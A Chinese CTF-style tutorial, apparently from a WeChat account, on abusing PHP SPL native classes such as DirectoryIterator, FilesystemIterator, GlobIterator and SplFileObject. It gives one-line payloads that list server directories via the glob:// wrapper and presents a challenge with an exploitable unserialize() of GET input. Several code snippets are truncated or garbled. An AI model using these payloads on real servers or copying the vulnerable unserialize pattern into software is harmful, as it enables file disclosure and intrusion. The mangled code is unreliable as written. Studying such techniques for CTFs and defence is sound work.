SPL就是Standard PHP Library的缩写。据手册显示，SPL是用于解决 **典型问题(standard problems)**
的一组接口与类的集合：
SPL 对 PHP 引擎进行了扩展，例如 ArrayAccess、Countable 和 SeekableIterator
等接口，它们用于以数组形式操作对象。同时，你还可以使用 RecursiveIterator、ArrayObejcts
等其他迭代器进行数据的迭代操作。它还内置几个的对象例如 Exceptions、SplObserver、Spltorage 以及
splautoloadregister、splclasses、iteratorapply 等的帮助函数（helper
functions），用于重载对应的功能。这些工具聚合在一起就好比是把多功能的瑞士军刀，善用它们可以从质上提升 PHP 的代码效率。
因为SPL是要解决典型问题，免不了有一些处理文件的类。下面，我们简单的挑几个SPL中常用的文件处理原生类进行讲解，其他的等以后遇到了在添进来。
###  可遍历目录类
可遍历目录类有以下几个：
  * DirectoryIterator 类
  * FilesystemIterator 类
  * GlobIterator 类
**DirectoryIterator 类**
DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。
**类摘要：**
    DirectoryIterator extends SplFileInfo implements SeekableIterator {
        /* 方法 */
        public __construct ( string $path )
        public current ( ) : DirectoryIterator
        public getATime ( ) : int
        public getBasename ( string $suffix = ? ) : string
        public getCTime ( ) : int
        public getExtension ( ) : string
        public getFilename ( ) : string
        public getGroup ( ) : int
        public getInode ( ) : int
        public getMTime ( ) : int
        public getOwner ( ) : int
        public getPath ( ) : string
        public getPathname ( ) : string
        public getPerms ( ) : int
        public getSize ( ) : int
        public getType ( ) : string
        public isDir ( ) : bool
        public isDot ( ) : bool
        public isExecutable ( ) : bool
        public isFile ( ) : bool
        public isLink ( ) : bool
        public isReadable ( ) : bool
        public isWritable ( ) : bool
        public key ( ) : string
        public next ( ) : void
        public rewind ( ) : void
        public seek ( int $position ) : void
        public __toString ( ) : string    // 以字符串形式获取文件名
        public valid ( ) : bool
    }
**利用 DirectoryIterator 类遍历指定目录里的文件：**
如果我们这样：
     glob:// 协议用来查找匹配的文件路径模式
    ');
        //echo($f->__toString().'');
    }
**FilesystemIterator 类**
FilesystemIterator 类与 DirectoryIterator
类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。
该类的使用方法与DirectoryIterator 类也是基本相同的：
    ');
        //echo($f->__toString().'');
    }
**GlobIterator 类**
与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于
glob()，可以通过模式匹配来寻找文件路径。
**类摘要：**
    GlobIterator extends FilesystemIterator implements SeekableIterator , Countable {
        /* 方法 */
        public __construct ( string $pattern , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO )
        public count ( ) : int
        /* 继承的方法 */
        public FilesystemIterator::__construct ( string $path , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::SKIP_DOTS )
        public FilesystemIterator::current ( ) : mixed
        public FilesystemIterator::getFlags ( ) : int
        public FilesystemIterator::key ( ) : string
        public FilesystemIterator::next ( ) : void
        public FilesystemIterator::rewind ( ) : void
        public FilesystemIterator::setFlags ( int $flags = ? ) : void
    }
我们知道，向下面这样在单纯的使用 DirectoryIterator 类和 FilesystemIterator
类且没有配合glob://协议进行匹配的时候：
    __toString().'');// 不加__toString()也可,因为echo可以自动调用
    }
    ?>
    # payload一句话的形式:
    $a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'');}
我们输入 `/?whoami=glob:///*` 即可列出根目录下的所有文件：
列出Web目录下的所有文件：
  * **使用 FilesystemIterator 类**
测试代码：
    __toString().'');// 不加__toString()也可,因为echo可以自动调用
    }
    ?>
    # payload一句话的形式:
    $a = new FilesystemIterator("glob:///*");foreach($a as $f){echo($f->__toString().'');}
  * **使用 GlobIterator 类**
由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob://协议了。
测试代码：
    __toString().'');// 不加__toString()也可,因为echo可以自动调用
    }
    ?>
    # payload一句话的形式:
    $a = new FilesystemIterator("/*");foreach($a as $f){echo($f->__toString().'');}
###  可读取文件类
目前发现的可读取文件类有：
  * SplFileObject 类
**SplFileObject 类**
SplFileInfo
类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：
该类的构造方法可以构造一个新的文件对象用于后续的读取。
我们可以像类似下面这样去读取一个文件的一行：
    class = "B";
            $this->para = "ctfer";
            echo new  $this->class ($this->para);
        }
        public function __wakeup()    // 可以直接绕过__wakeup()方法的执行
        {
            $this->check = new C;
            if($this->check->vaild($this->para) && $this->check->vaild($this->class)) {
                echo new  $this->class ($this->para);
            }
            else
                die('bad hacker~');
        }
    }
    class B{
        var $a;
        public function __construct($a)
        {
            $this->a = $a;
            echo ("hello ".$this->a);
        }
    }
    class C{
        function vaild($code){
            $pattern = '/[!|@|#|$|%|^|&|*|=|\'|"|:|;|?]/i';
            if (preg_match($pattern, $code)){
                return false;
            }
            else
                return true;
        }
    }
    if(isset($_GET['pop'])){
        unserialize($_GET['pop']);
    }
    else{
        $a=new A;
    }
在A类中可以动态拼接类，就像PHP动态执行函数一样。但是题目给出的A、B、C三个类但是都没有什么危险函数，应该是没有利用的点，想到应该是原生类的利用。我们可以利用上面说的那几个文件处理的原生去读文件。
首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：
公众号：WHOAMIAnony